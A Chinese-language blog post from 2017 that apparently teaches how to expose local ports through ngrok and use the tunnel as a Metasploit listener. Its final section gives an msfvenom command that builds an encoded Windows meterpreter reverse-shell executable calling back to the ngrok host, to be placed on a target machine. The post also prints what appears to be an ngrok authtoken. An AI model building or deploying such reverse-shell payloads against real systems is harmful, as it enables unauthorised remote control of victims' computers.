---
title: Ngrok&MSF(内网穿)
date: 2017-05-30 20:40:44
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=467344119&auto=0&height=66"></iframe>
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/ngrok_msf.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

## 实例讲解
## 0x00.
少宇师傅前阵子发了一篇ngrok的文章，由于没时间 ，也没去测试，现在正好有时间过来测试下。
www.github.com/jas502n
感谢少宇师傅的耐心教导。
&nbsp;
 ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放.
Ngrok的下载地址:https://ngrok.com/download
下面以我的Mac os X 为例子，下载ngrok。
&nbsp;
![enter description here][2]
&nbsp;
解压后得出，ngrok包
&nbsp;
![enter description here][3]
&nbsp;
## 0X01.
我选择将ngrok复制到/bin
&nbsp;
![enter description here][4]
&nbsp;
## 0X02.HTTP
&nbsp;
![enter description here][5]
&nbsp;
## 1.安装你的token
&nbsp;
<pre>ngrok  authtoken  6RBm_2CfWq3xAJ3XVK</pre>
&nbsp;
![enter description here][6]
&nbsp;
根据官方文档 使用http的时候 使用ngrok http 80(将本地80端口映射到ngrok外网)，比如我们本机开启了80端口（apache）需要映射到外网。

开启XAMPP apache服务 80端口
&nbsp;
![enter description here][7]

&nbsp;
![enter description here][8]
&nbsp;
本机中的localhost 
![enter description here][9]
&nbsp;
图中可以看到，已将本机的80端口映射到 ngrok.io中
<pre>ngrok http 80</pre>
&nbsp;
![enter description here][10]
&nbsp;
我们可以来验证下： http://xxxx571a.ngrok.io 中是否有映射。
&nbsp;
![enter description here][11]
&nbsp;
打开web 控制台，可以查看状态
http://127.0.0.1:4040/inspect/http
![enter description here][12]
&nbsp;
&nbsp;
## 0x03 TCP
&nbsp;
配置完了Ngrok  上个试了下http，我再来试试TCP
&nbsp;
我们使用 ngrok 帮助参数 tcp
![enter description here][13]
&nbsp;
ngrok tcp 2222 将本机的2222映射到ngrok的外网中。
![enter description here][14]
&nbsp;
![enter description here][15]
&nbsp;
## 0x04 Metasploit
配置msf马
&nbsp;
![enter description here][16]
&nbsp;
<pre>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=52.15.xxx.xx(ip填写对应的ngrok对应的ip)  LPORT=1629x(端口填写对应的ngrok的映射的端口)  -f exe > demon.exe</pre>
&nbsp;
![enter description here][17]
&nbsp;
放入目标机子上得到反弹
&nbsp;
![enter description here][18]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/5049644-hacker-computer-hacking.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496151747254.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496151934414.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152066374.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152312190.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152403046.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153564256.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153547966.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153815620.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/0747E02D-A926-41A2-9CB4-BA2A3891F09D.png
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/AAC3906C-F13E-4D13-9ADB-E20DFFDF0626.png
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154262914.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154592299.jpg
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154448600.jpg
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154532851.jpg
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/24086F68-D41C-4AFD-98D1-158B33B269DB.png
  [17]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1496157985712.jpg
  [18]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/96D47762-CF00-478F-BD1B-42A1009F6D34.png 